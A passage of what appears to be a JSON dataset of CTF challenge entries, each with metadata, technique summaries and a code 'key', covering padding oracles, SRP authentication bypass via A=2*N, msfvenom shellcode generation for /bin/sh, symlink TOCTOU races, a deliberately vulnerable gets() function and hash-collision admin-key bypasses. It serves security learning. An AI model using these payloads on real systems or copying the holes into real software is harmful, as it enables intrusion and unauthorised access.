        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving dynamic values that must be manipulated to match certain targets, automating the process through scripting is essential. This applies particularly in scenarios where the solution involves interacting with a network service or a complex input/output system. Start by mapping out how different inputs affect the dynamic values, then use these mappings to calculate the necessary inputs to achieve the target values. This approach is useful in CTF challenges that require iteratively solving puzzles or manipulating game states to reach a certain condition.",
            "The use of Python's socket programming for interacting with network services can be extended to solve challenges that involve real-time data manipulation based on server responses. After establishing a connection and receiving data, dynamically parse server responses to determine the next course of action. This includes reading and interpreting values, calculating the necessary inputs to achieve a desired outcome, and sending these inputs back to the server. This method is particularly effective in challenges where the goal is to automate the process of reaching a certain state or solving a puzzle through a network service. \n\n    Sample Python snippet for interacting with a network service:\n    ```python\n    import socket\n\n    def connect_to_service(host, port):\n        s = socket.socket()\n        s.settimeout(5)\n        s.connect((host, port))\n        return s\n\n    def send_and_receive_data(socket, data):\n        socket.send(data.encode('utf-8'))\n        response = socket.recv(1024).decode('utf-8')\n        return response\n    ```\n    This snippet demonstrates establishing a connection to a service and sending/receiving data, which can be adapted for various challenges requiring network interaction."
        ],
        "key": "```python\ndef get_values(buf):  \n\tpat_str = 'values:'+'\\s+([-\\d]+)'*8+'\\s+\\|\\s\\|\\s+target:' + '\\s+([-\\d]+)'*8+'\\s+\\|'  \n\tpat = re.compile(pat_str,re.DOTALL)  \n\tmatch = re.search(pat,buf)  \n\tvalues = [int(match.group(i)) for i in range(1,9)]  \n\ttarget = [int(match.group(i)) for i in range(9,17)]  \n\treturn values,target\n\ndef solve_values_target(diff_tuple,round_values,next_value=1):  \n\tglobal global_values_target\n\n\tif next_value >= 9:  \n\t\treturn None\n\n\tif (diff_tuple,next_value) in global_values_target:  \n\t\treturn global_values_target[diff_tuple,next_value]\n\n\tif min(diff_tuple) == 0 and max(diff_tuple) == 0:  \n\t\treturn []\n\n\tfor i in range(10):  \n\t\tif max(diff_tuple) == 0:  \n\t\t\tglobal_values_target[diff_tuple,next_value] = [i]  \n\t\t\treturn global_values_target[diff_tuple,next_value]  \n\t\tret = solve_values_target(diff_tuple,round_values,next_value+1)  \n\t\tif ret is not None:  \n\t\t\tglobal_values_target[diff_tuple,next_value] = [i]+ret  \n\t\t\treturn global_values_target[diff_tuple,next_value]  \n\t\tdiff_tuple = tuple((diff_tuple[j]-round_values[next_value][j]) for j in range(8))  \n\t\tif min(diff_tuple) < 0:  \n\t\t\tbreak  \n\treturn None\n```"
    },
    {
        "name": "Day 6_ Udpsanta",
        "write_up": "dataset/raw/Day 6_ Udpsanta.md",
        "type": "crypto",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When facing encrypted messages over a network protocol lacking message authentication (MAC, HMAC, etc.) and employing predictable error messages or responses, consider exploiting a padding oracle attack. This type of attack can be particularly effective if the encryption mode is CBC, and no message authentication is implemented. It allows for iterative guessing of one byte at a time by observing the presence or absence of error messages in response to modified ciphertexts.",
            "When a service's cryptographic implementation does not include appropriate randomness (e.g., a fixed IV) or relies on predictable error messages, it may be vulnerable to decryption without needing the encryption key. This vulnerability can be exploited by manipulating ciphertexts and observing the changes in error messages or application behavior to infer plaintext data. A common approach to leverage this vulnerability includes:\n   - Determining the encryption IV by exploiting predictable responses or error messages.\n   - Systematically manipulating ciphertext blocks and monitoring responses to deduce plaintext one byte at a time.\n   - Exploiting the lack of message authentication to inject or modify messages within the encrypted communication."
        ],
        "key": "```python\ndef timmy_decrypt(cipher):  \n    TIMMY_KEY = b'\\x9f\\xa2(\\xe6\\x88hDb\\x9f.\\x1fq\\xf9\\xc7\\x91mW\\x86\\xc8\\xb1\\xa4\\x9fK\\xf0\\xfa=Y\\xe3%$\\xc5\\x04'  \n    TIMMY_IV = b'\\x92\\xc4\\xc8\\xfet\\xf4\\x11\\xe5\\x88u\\x9a\\x14\\xab\\x96\\xbe\\x1e'  \n    a = AES.new(TIMMY_KEY,AES.MODE_CBC,iv=TIMMY_IV)  \n    print('cipher',len(cipher),cipher)  \n    plain = a.decrypt(cipher)  \n    print('plain',len(plain),plain)  \n    return plain\n```"
    },
    {
        "name": "Day 7_ Homebrew",
        "write_up": "dataset/raw/Day 7_ Homebrew.md",
        "type": "crypto",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When interacting with a web service that uses the Secure Remote Password (SRP) protocol, one can bypass authentication by sending specific values (such as `0`, `N`, `2*N`, etc.) as the `A` value during the login process. This method exploits the protocol by ensuring that the server mathematically reduces the challenge to something that can be easily solved or bypassed, allowing unauthorized access without needing the correct credentials. Specifically, for SRP, submitting `A=0` or a multiple of `N` leads to the server calculating a session key (`S`) that is predictable and typically zero or another value known to the attacker, facilitating the login without the correct password. This approach highlights the importance of validating all client-provided parameters in cryptographic protocols to prevent such bypasses. Example payload: For SRP protocol, use `{'I':'admin','A':2*N}` in the login step1 request, where `N` is the modulus parameter from the SRP setup.",
            "Utilizing HTTP OPTIONS requests can reveal hidden or undocumented API endpoints in web applications that could lead to uncovering vulnerabilities or additional functionality not directly accessible through the web interface. This is particularly useful in CTF challenges and real-world applications where discovering hidden endpoints can disclose intended methods for interaction with the application, or expose endpoints that were not designed to withstand direct attack. Regularly using OPTIONS requests as part of a web application assessment can uncover paths like `/signup/step1`, `/login/step1`, and `/login/step2` as demonstrated, which may provide further opportunities for exploitation or unauthorized access. This emphasizes the necessity of a thorough application mapping phase during penetration testing to ensure all features and potential vulnerabilities are discovered. Example payload: Craft an OPTIONS request like `OPTIONS /signup` to retrieve available methods and additional hidden endpoints."
        ],
        "key": "```python\ndef validate():  \n    j = print_spec('/signup')  \n    N = j['params']['N']  \n    g = j['params']['g']  \n    k = j['params']['k']\n\n    js1 = print_spec('/signup/step1')  \n    I = js1['prereq_example']['I']  \n    P = js1['prereq_example']['P']  \n    salt = js1['prereq_example']['salt']  \n    xH = js1['prereq_example']['xH']  \n    x = js1['prereq_example']['x']  \n    v = js1['prereq_example']['v']  \n    assert xH == get_sha256(str(salt)+P)  \n    assert x == int(xH,16)  \n    assert v == pow(g,x,N)\n\n    jl = print_spec('/login')\n\n    jl1 = print_spec('/login/step1')  \n    I = jl1['prereq_example']['I']  \n    a = jl1['prereq_example']['a']  \n    A = jl1['prereq_example']['A']  \n    assert A == pow(g,a,N)\n\n    jl2 = print_spec('/login/step2')  \n    a = jl2['prereq_example']['a']  \n    A = jl2['prereq_example']['A']  \n    B = jl2['prereq_example']['B']  \n    salt = jl2['prereq_example']['salt']  \n    P = jl2['prereq_example']['P']  \n    uH = jl2['prereq_example']['uH']  \n    u = jl2['prereq_example']['u']  \n    xH = jl2['prereq_example']['xH']  \n    x = jl2['prereq_example']['x']  \n    S = jl2['prereq_example']['S']  \n    K = jl2['prereq_example']['K']  \n    proof = jl2['req_example']['proof']  \n    assert uH == get_sha256(str(A)+str(B))  \n    assert u == int(uH,16)  \n    assert xH == get_sha256(str(salt)+P)  \n    assert x == int(xH,16)  \n    assert S == pow(B-k*pow(g,x,N),(a+u*x),N)  \n    assert K == get_sha256(str(S))\n\n    print(proof)  \n    print(get_proof(salt,K))  \n    print(hmac.new(str(salt).encode('ascii'),K.encode('ascii'),SHA256).hexdigest())  \n    assert proof == get_proof(salt,K)\n\n    a = random.randint(1,2**32-1)  \n    A = pow(g,a,N)  \n    b = random.randint(1,2**32-1)  \n    B = k*v+pow(g,b,N)  \n    uH = get_sha256(str(A)+str(B))  \n    u = int(uH,16)\n\n    S1 = pow(B-k*v,(a+u*x),N)  \n    S2 = pow(A*pow(v,u,N),b,N)  \n    print('S1:',S1%N)  \n    print('S2:',S2%N)  \n    assert S1 == S2\n\n    sys.exit(0)\n```"
    },
    {
        "name": "Day 9_ Tiny",
        "write_up": "dataset/raw/Day 9_ Tiny.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving decoding \"DNA sequences\" into executable formats or readable content, each nucleotide (A, C, T, G) can correspond to binary representations. Mapping these to 0-3 respectively allows for conversion into byte code. This process might require trying multiple mappings due to the ambiguity in how nucleotides are translated to binary. A practical approach would be to attempt all 24 permutations derived from the four nucleotides and examine which results in a valid or recognizable format.",
            "In challenges where specific byte patterns (e.g., `CD 80` or `0F 34`) are disallowed within a payload for execution, utilizing encoding tools like `msfvenom` enables the generation of shellcode that avoids these restricted sequences. By specifying bad characters with the `-b` option, `msfvenom` can create payloads that circumvent the restrictions imposed by the program or challenge environment. A sample usage is `msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x0f\\x80' --smallest`, targeting Linux x86 architecture to execute `/bin/sh` without the specified bad characters."
        ],
        "key": "```c\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        // Jump to undefined behavior\n        return -1;\n    }\n    char *ptr = argv[1];\n    while (*(uint16_t *)ptr != 0) {\n        if (*(uint16_t *)ptr == 0x80CD) {\n            // Jump to undefined behavior\n            return -1;\n        }\n        if (*(uint16_t *)ptr == 0x340F) {\n            // Jump to undefined behavior\n            return -1;\n        }\n        ptr++;\n    }\n    // Return to the pushed \"argv[1]\", our shellcode\n    return 0;\n}\n```"
    },
    {
        "name": "decompile me",
        "write_up": "dataset/raw/decompile me.md",
        "type": "The type of CTF challenge described in the write-up is a reverse challenge.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges dealing with encryption, particularly with the RC4 algorithm, it's paramount to examine the initialization and encryption routines closely for deviations from standard implementations. This can involve inspecting the setup of key and s-box arrays, as reverse-engineered code might not explicitly show the use of certain registers (e.g., `r13` for the s-box and `r12` for the key) that are essential for the encryption process. A custom calling convention or a closer inspection of assembly might reveal the actual parameters being used, which are critical for correctly decrypting the data.",
            "When encountering a function that appears to be a standard library call in reverse-engineered code (e.g., `memcmp`), it's crucial to inspect its functionality in detail. The implementation might differ significantly from the standard one, performing operations that are unexpected, such as XOR-based comparison or validation checks that don't just compare but also manipulate data. This can be a critical point for understanding how data is being processed or validated, revealing hidden conditions or processes essential for solving the challenge."
        ],
        "key": "```c\ndo {  \n  *(char *)(unaff_R13 + uVar3) = (char)uVar3;  \n  uVar2 = (int)uVar3 + 1;  \n  uVar3 = (ulong)uVar2;  \n} while (uVar2 < 0x100);\n\nbVar1 = 0;  \nuVar3 = 0;  \ndo {  \n  bVar1 = bVar1 | *(byte *)(unaff_R14 + uVar3) ^ *(byte *)((long)&dat + uVar3);  \n  uVar2 = (int)uVar3 + 1;  \n  uVar3 = (ulong)uVar2;  \n} while (uVar2 < (uint)__n);\n```"
    },
    {
        "name": "Decrypt Vulnerable Data #1",
        "write_up": "dataset/raw/Decrypt Vulnerable Data #1.md",
        "type": "crypto",
        "competition": [
            "HackersPlayground/2020",
            "https://ctftime.org/event/1107/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "When facing an LFSR-based encryption scheme in a CTF challenge, a known plaintext attack (KPA) can be executed if a portion of the plaintext is known. This method involves bruteforcing a segment of the secret (such as the LFSR salt) by repeatedly generating output bits from the LFSR with various salt values. By XORing these output bits with both the known plaintext and the corresponding ciphertext bits, it's possible to reconstruct other parts of the LFSR's state or output, thus facilitating the decryption of the remaining ciphertext.",
            "If an encryption algorithm uses multiple Linear Feedback Shift Registers (LFSRs) with different lengths and initialization methods, and part of the ciphertext aligns with a known plaintext, the setup allows for the reverse engineering of LFSR states. Specifically, by determining the initial state of one LFSR (via known plaintext and bruteforce), one can compute the output of another LFSR at a specific state by XORing known plaintext bits, known ciphertext bits, and the output bits from the first LFSR. This method can effectively decrypt the message or further reveal the internal state of the LFSRs for continued decryption without needing to crack the full key directly.\n\nExample of bruteforcing the first LFSR's salt and reconstructing the second LFSR's state:\n```\nfor salt1 in range(1 << 16):  \n    lfsr17 = LFSR(17, salt1, True)  \n    reg2_initial_state = find_reg2(lfsr17)  \n    lfsr25 = LFSR(25, 0, False, reg2_initial_state)  \n    # Followed by the decryption logic...\n```"
        ],
        "key": "```python\nfrom Crypto.Util.number import getRandomInteger  \nfrom secret import flag\n\nclass LFSR:  \n\tdef __init__(self, size, salt, invert):  \n\t\tassert(size == 17 or size == 25)  \n\t\tself.size = size  \n\t\tself.register = ((salt >> 3) << 4) + 8 + (salt & 0x7)  \n\t\tself.taps = [0, 14]  \n\t\tif size == 25:  \n\t\t\tself.taps += [3, 4]  \n\t\tself.invert = 1 if invert == True else 0  \n\tdef clock(self):  \n\t\toutput = reduce(lambda x, y: x ^ y, [(self.register >> i) & 1 for i in self.taps])  \n\t\tself.register = (self.register >> 1) + (output << (self.size - 1))\n\n\t\toutput ^= self.invert  \n\t\treturn output\n\ndef encryptData(key, data):  \n\tassert(key < 2**40)  \n\tdata = data.decode(\"hex\")\n\n\tlfsr17 = LFSR(17, key >> 24, True)  \n\tlfsr25 = LFSR(25, key & 0xffffff, False)\n\n\tkeystream = 0  \n\tfor i in range(len(data) * 8):  \n\t\tkeystream <<= 1  \n\t\tkeystream |= lfsr17.clock() ^ lfsr25.clock()\n\n\tpt = int(data.encode(\"hex\"), 16)  \n\tct = (\"%x\"%(pt ^ keystream)).rjust(len(data) * 2, \"0\")\n\n\treturn ct\n\ndef decryptData(key, ct):  \n\treturn encryptData(key, ct)\n\ndisc_data = \"The flag is: %s\"%flag\n\nkeylen = 5  \nkey = getRandomInteger(keylen * 8)\n\nct = encryptData(key, disc_data.encode(\"hex\"))  \nassert(decryptData(key, ct).decode(\"hex\") == disc_data)\n\nwith open(\"enc_data.txt\", \"w\") as f:  \n\tf.write(ct)  \n```"
    },
    {
        "name": "defcamp6",
        "write_up": "dataset/raw/defcamp6.md",
        "type": "web",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 320,
        "max_score": 347,
        "difficulty": 0.9221902017291066,
        "knowledge": [
            "For challenges combining OSINT and Steganography, when provided with an image, it's invaluable to employ tools like the WayBack Machine to find original versions of the image. This comparison can lead to the identification of subtle manipulations used to hide information within the image.",
            "When comparing the original and modified images and finding differences in the pixel values (RGB channels), it might indicate that data is encoded via the subtraction of these values. A simple script can then be employed to iterate over the pixels, subtracting the values of corresponding channels to extract ASCII characters which could compose the flag. Conditions for effective use include having both the original and altered image and knowing the encoding technique relies on the subtraction of pixel values. Example code snippet: \n```python\nfrom PIL import Image\n\n# Open the original and the modified image\noriginal_image = Image.open('original_image_path.jpg')\nmodified_image = Image.open('modified_image_path.jpg')\n\noriginal_pixels = list(original_image.getdata())\nmodified_pixels = list(modified_image.getdata())\n\n# Extract hidden data through pixel value subtraction\nhidden_data = \"\"\nfor original_pixel, modified_pixel in zip(original_pixels, modified_pixels):\n    hidden_data += chr(abs(original_pixel[0] - modified_pixel[0]))\n\nprint(hidden_data)\n```"
        ],
        "key": "```python\n#!/usr/bin/env python3\n\nfrom PIL import Image  \n\nimage_path = \"flag_encoded.png\"  \nalt_image_path = \"./2015_buc_1.jpg\"\n\nimage = Image.open(image_path)  \nalt_image = Image.open(alt_image_path)\n\npixels = list(image.getdata())  \nalt_pixels = list(alt_image.getdata())\n\nextracted_data = \"\"  \nfor i in range(69):  \n\tpixel_values = pixels[i]  \n\talt_pixel_values = alt_pixels[i]  \n\tprint(chr(alt_pixel_values[0] - pixel_values[0]), end='')  \n```"
    },
    {
        "name": "Delegate wallet",
        "write_up": "dataset/raw/Delegate wallet.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 465,
        "max_score": 1000,
        "difficulty": 0.465,
        "knowledge": [
            "When dealing with challenges involving Linear Congruential Generator (LCG) based pseudo-random number generators, if parameters like `n` are constant and known, it is possible to predict future outputs by obtaining at least three consecutive outputs. This is due to the deterministic nature of LCGs where knowing the modulus (`n`), multiplier (`m`), and increment (`c`) allows for the entire sequence of numbers to be predicted. The method involves solving for `m` and `c` using consecutive output values (`s1`, `s2`, `s3`) and the modulus (`n`):\n   - To solve for `m`: `m = (s3 - s2) * (s2 - s1)^-1 mod n`\n   - To solve for `c`: `c = (s2 - m*s1) mod n`",
            "The application of modular inverse in calculating the multiplier (`m`) for the LCG reveals that knowing just a few outputs in sequence allows us to break the generator and predict future outputs. Tools like `gmpy2` can be used efficiently to compute the modular inverse (`(s2 - s1)^-1 mod n`). This technique only requires basic arithmetic operations and modular inverses, making it widely applicable in scenarios where the internal state or parameters (other than the modulus) of an LCG are not initially known but can be inferred from observed outputs:\n   - Sample code snippet to calculate `m` and `c`:\n     ```python\n     n = pow(2, 607) - 1\n     m = ((s3 - s2) * gmpy2.invert(s2 - s1, n)) % n\n     c = (s2 - m * s1) % n\n     ```\n\nThese points highlight fundamental weaknesses in LCGs when used for cryptographic purposes, emphasizing the importance of choosing secure pseudo-random number generators in cryptographic applications."
        ],
        "key": "```python\nclass prng_lcg:\n\n   def __init__(self):  \n       self.n = pow(2, 607) -1   \n       self.c = random.randint(2, self.n)  \n       self.m = random.randint(2, self.n)  \n       self.state = random.randint(2, self.n)\n\n   def next(self):  \n       self.state = (self.state * self.m + self.c) % self.n  \n       return self.state\n```"
    },
    {
        "name": "Detective",
        "write_up": "dataset/raw/Detective.md",
        "type": "pwn",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": -1.0,
        "max_score": 597,
        "difficulty": -1,
        "knowledge": [
            "When tackling CTF challenges that involve literary or cultural references, the missing pieces or the hinted elements in the question can often represent a clue to the solution. In cases where a challenge uses a part of a well-known fact or a piece of literature as a clue, consider using the missing information to guide your next steps. For instance, if the challenge involves a partially censored well-known title or name, filling in the blanks with the appropriate words or letters can lead to discovering paths or keys for proceeding in the challenge.",
            "In challenges involving retrieving information from online platforms or social profiles, tools like Sherlock can be utilized to track down usernames across various social media and online platforms. This can be helpful in situations where you are given a hint or a specific username related to a challenge. Using Sherlock or similar tools allows you to automate the search process across multiple sites quickly, potentially unearthing useful information such as repositories, posts, or other user-generated content that could contain flags or further clues.\n   - Example usage: `python3 sherlock username`",
            "For binary exploitation challenges that allow arbitrary write operations within the Heap, crafting a fake chunk can be a strategic method to avoid crashing the program, especially when handling characters (byte values) that could disrupt the execution flow. This approach can be applied when the binary writes a byte to the Heap, and you have some control over where that byte is written. By carefully setting up a fake chunk at a specified address that does not cause the program to crash when processing a particular input (such as the ASCII character 'A'), one can safely manipulate the heap to leak sensitive information like flags byte by byte.\n   - Example context: This strategy is particularly useful when you need to bypass restrictions or traps within a binary that is designed to handle or manipulate data in specific, potentially vulnerable ways."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid vulnerable_function() {\n    char *heap_buffer = (char *)malloc(64);\n    char input[128];\n\n    printf(\"Enter some data: \");\n    gets(input); // Vulnerable function: gets() allows buffer overflow\n\n    strcpy(heap_buffer, input); // Potential overflow if input is larger than 64 bytes\n\n    printf(\"You entered: %s\\n\", heap_buffer);\n\n    free(heap_buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "DevMaster 8000",
        "write_up": "dataset/raw/DevMaster 8000.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 136,
        "max_score": 500,
        "difficulty": 0.272,
        "knowledge": [
            "In challenges featuring a sandbox environment that allows file manipulation and execution of commands, a TOCTOU (Time of Check to Time of Use) vulnerability can be exploited through symlink attacks if checks on file paths are performed before file access. If the environment supports atomic operations like `renameat2` with `RENAME_EXCHANGE`, it can enhance the efficiency and success rate of the attack by minimizing the window where the file is unavailable, thus reducing the risk of service disruption. This can be useful in scenarios where the service performs checks to ensure files are within a certain directory and does not allow symlinks to bypass these checks.\n    - Example payload to repeatedly swap a regular file with a symlink, using atomic replace to prevent service crash:\n    ```c\n    syscall(__NR_renameat2, AT_FDCWD, \"f1\", AT_FDCWD, \"f2\", RENAME_EXCHANGE);\n    ```",
            "In challenges that allow asynchronous operations, exploiting race conditions can be an effective approach. If a service allows fetching files while other operations (e.g., file manipulation) are in progress, one could leverage the timing difference between check and use phases to manipulate the outcome. For instance, if a fetch operation does not impersonate a sandbox user and merely checks if the requested file path resolves within the allowed directory, introducing a race condition by altering the target (e.g., swapping a file with a symlink to a restricted file) between these checks can lead to unauthorized access. The strategy involves creating a condition where during the check, the file appears as a regular file, but by the time of access, it is a symlink to the desired restricted file, exploiting the TOCTOU vulnerability.\n    - Example approach to trigger race condition:\n    ```python\n    for _ in xrange(1000):\n        send_fetch(p, 0, \"f1\")\n        time.sleep(0.1)\n    ```"
        ],
        "key": "```c++  \n std::unique_ptr<char> real_path(realpath((dir + file).c_str(), nullptr));  \n if (string(real_path.get()).substr(0, dir.size()) != dir) {  \n   SendServerError(string(\"Filenames must point to within the working\ndirectory, \") + dir +  \n                   string(\". Attempted to fetch file with absolute path \") + real_path.get());  \n   return;  \n }\n\n ifstream infile(real_path.get());  \n if (!infile.is_open()) {  \n   SendServerError(string(\"Failed to open file  \") + real_path.get() +  \n                   string(\": \") + strerror(errno));  \n }  \n string body = ReadFile(infile);  \n```  \n\n```c  \n// Linux doesn't offer a mechanism for waiting on multiple semaphores at once.  \n// So, sadly, we busywait.  \n// Returns the index of which semaphore was in fact decremented.  \nsize_t MultiDecrement(std::vector<IpcSemaphore>* sems, int count=1) {  \n while(true) {  \n   for (size_t i = 0; i < sems->size(); ++i) {  \n     if ((*sems)[i].TryDecrement(count)) return i;  \n   }  \n usleep(10000);  // 10 ms  \n }  \n}  \n```"
    },
    {
        "name": "DevMaster 8001",
        "write_up": "dataset/raw/DevMaster 8001.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 326,
        "max_score": 500,
        "difficulty": 0.652,
        "knowledge": [
            "TOCTOU (Time of Check to Time of Use) vulnerabilities can be exploited in asynchronous systems, particularly in environments where file state can change between validation and use. This is observed in systems that check files' locations or symbolic link (symlink) resolution prior to file operation execution, without locking the state of the filesystem. This creates an opportunity to alter the filesystem state between the check and the use phases, leading to unauthorized file access. An effective strategy to exploit such vulnerabilities involves creating a race condition where a legitimate file is checked but is swapped with a symlink to a restricted file just before access, thus bypassing security checks. \n\n    Example payload strategy:\n    ```c\n    syscall(__NR_renameat2, AT_FDCWD, \"file1\", AT_FDCWD, \"file2\", RENAME_EXCHANGE);\n    ```\n    This syscall command is executed in a loop to continuously swap a regular file with a symlink, attempting to win the race condition.",
            "When exploiting sandbox environments, especially those utilizing Linux's capabilities and restrictions, it is beneficial to understand and exploit the underlying mechanics\u2014such as the use of System V semaphores for sandbox user control. This knowledge can aid in finding indirect ways to elevate privileges or access restricted information. In the context provided, the semaphore mechanism and the admin panel binary's behavior of rebuilding itself present potential, albeit challenging, vectors for exploitation. Knowledge of these mechanisms can guide the development of an exploit by focusing on timing attacks or race conditions that leverage the window between the semaphore being released and the admin panel binary being fetched."
        ],
        "key": "```c++  \n std::unique_ptr<char> real_path(realpath((dir + file).c_str(), nullptr));  \n if (string(real_path.get()).substr(0, dir.size()) != dir) {  \n   SendServerError(string(\"Filenames must point to within the working\ndirectory, \") + dir +  \n                   string(\". Attempted to fetch file with absolute path \") + real_path.get());  \n   return;  \n }\n\n ifstream infile(real_path.get());  \n if (!infile.is_open()) {  \n   SendServerError(string(\"Failed to open file  \") + real_path.get() +  \n                   string(\": \") + strerror(errno));  \n }  \n string body = ReadFile(infile);  \n```  \n\n```c  \n// Linux doesn't offer a mechanism for waiting on multiple semaphores at once.  \n// So, sadly, we busywait.  \n// Returns the index of which semaphore was in fact decremented.  \nsize_t MultiDecrement(std::vector<IpcSemaphore>* sems, int count=1) {  \n while(true) {  \n   for (size_t i = 0; i < sems->size(); ++i) {  \n     if ((*sems)[i].TryDecrement(count)) return i;  \n   }  \n usleep(10000);  // 10 ms  \n }  \n}  \n```"
    },
    {
        "name": "dhke_intro",
        "write_up": "dataset/raw/dhke_intro.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When decrypting ciphertext secured by Diffie-Hellman key exchange with small prime numbers, an exhaustive search (brute force) method can be applied effectively. By iterating over all possible combinations of chosen primes and corresponding secret integers within the given prime range, one can generate and test each possible key until the correct key is found. This method capitalizes on the vulnerability posed by the small size of the prime numbers, allowing a feasible search space for potential keys. This approach necessitates converting each trial key into the proper format and size for the encryption algorithm used, such as AES.",
            "For encryption mechanisms that require a fixed-size key, such as AES which needs a 128-bit key, padding the generated key to meet the required length can introduce a deterministic pattern that simplifies the decryption process under certain conditions. If the padding process is known and constant, as in the case of adding a known string to the beginning or end of the key until it reaches the required length, this knowledge can be exploited in decryption attempts to reverse-engineer the key or reduce the complexity of brute-force attacks. This method is particularly effective when the algorithm and padding process are known, highlighting the importance of using secure key generation and padding practices in cryptography."
        ],
        "key": "```python  \nimport random  \nfrom Crypto.Cipher import AES\n\n# generate key  \ngpList = [ [13, 19], [7, 17], [3, 31], [13, 19], [17, 23], [2, 29] ]  \ng, p = random.choice(gpList)  \na = random.randint(1, p)  \nb = random.randint(1, p)  \nk = pow(g, a * b, p)  \nk = str(k)\n\n# pad key to 16 bytes (128bit)  \nkey = \"\"  \ni = 0  \npadding = \"uiuctf2021uiuctf2021\"  \nwhile (16 - len(key) != len(k)):  \n   key = key + padding[i]  \n   i += 1  \nkey = key + k  \nkey = bytes(key, encoding='ascii')\n\nwith open('flag.txt', 'rb') as f:  \n   flag = f.read()\n\niv = bytes(\"kono DIO daaaaaa\", encoding = 'ascii')  \ncipher = AES.new(key, AES.MODE_CFB, iv)  \nciphertext = cipher.encrypt(flag)\n\nprint(ciphertext.hex())  \n```"
    },
    {
        "name": "Diffecient",
        "write_up": "dataset/raw/Diffecient.md",
        "type": "crypto",
        "competition": [
            "SekaiCTF/2022",
            "https://ctftime.org/event/1923/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a cryptographic challenge involving hashing functions, utilizing the concept of hash collisions can be critical. In scenarios where a vulnerability or weakness in the hashing algorithm (such as MurmurHash3) is known, searching for documented vulnerabilities or examples of hash collisions by cryptographers can provide a significant shortcut to finding a solution. This approach requires less effort than conducting original cryptanalysis or generating collisions from scratch.",
            "In challenges involving hash collisions where the input has specific length or content constraints (e.g., a minimum length or inclusion of certain character types), combining known hash collision pairs and extending their length (if the hashing algorithm is susceptible to length extension or maintains collision properties across varied input lengths) can effectively bypass these constraints. This strategy is based on understanding the properties of the hash function in use and leveraging existing cryptographic research.\n\nSample payload:\n- Original 16-byte collision inputs: 'bdd0c04b5c3995827482773b12acab35' and '652fa0565c3946be7482773b12acab35'\n- Extended to 32 bytes by duplication, successfully passed the admin key checks: 'bdd0c04b5c3995827482773b12acab35bdd0c04b5c3995827482773b12acab35' and '652fa0565c3946be7482773b12acab35652fa0565c3946be7482773b12acab35'"
        ],
        "key": "```python  \ndef _add(self, item):  \n    self.__i += 1  \n    for i in range(self.__k):  \n        self.__digests.add(self.hash(item, i) % self.__m)\n```"
    },
    {
        "name": "Dive in to Numbers",
        "write_up": "dataset/raw/Dive in to Numbers.md",
        "type": "The type of challenge in this write-up is **crypto**.",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 477,
        "max_score": 500,
        "difficulty": 0.954,
        "knowledge": [
            "When reversing binary challenges involving encoding or encryption schemes, converting strings to integers for manipulation using libraries such as GMP (GNU Multiple Precision Arithmetic Library) is a common technique. Specifically, when an hexadecimal string is converted to a big integer before applying the cryptographic operations, reversing involves understanding the conversion process to correctly interpret the original data and apply reverse operations. Example technique: Convert hexadecimal string `a3d5` to a big integer, perform operations, then convert back to understand original data manipulation.",
            "In challenges that involve encryption schemes with mathematical operations causing lossy conversions or approximations, it's possible to deduce the original inputs by setting up equations based on the encryption logic provided in the challenge. This often requires understanding the mathematical basis of the encryption or encoding scheme to formulate equations that represent the operation. In scenarios where precision loss occurs due to the operations, a brute force approach can be used to fine-tune the results to recover the original data or inputs. Example technique: Suppose an encryption scheme outputs `a1` and `a2` as encrypted values for inputs `x` and `y` with operations suggesting `(x + 2y) / 3 = a1` and `(y + 2*2x) / 3 = a2`. Solving these equations gives `x = 3*(2*a2-a1)/7` and `y = 3*(4*a1-a2)/7`. A brute force method might be required to adjust for any loss in precision to retrieve the exact original inputs `x` and `y`."
        ],
        "key": "```cpp\nif ( str_len != r )  \n{  \n  v4 = std::operator<<<std::char_traits<char>>(&std::cout, \"Your number is very small!\");  \n  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);  \n  exit(0);  \n}\nstd::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::substr(sub_1, inp_data, 0LL, r);  \nmpz_set_str(x, sub_1, 10u);  \nstd::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(sub_1);  \nstd::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::substr(sub_2, inp_data, r, -1LL);  \nmpz_set_str(y, sub_2, 10u);  \nstd::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(sub_2);\n```"
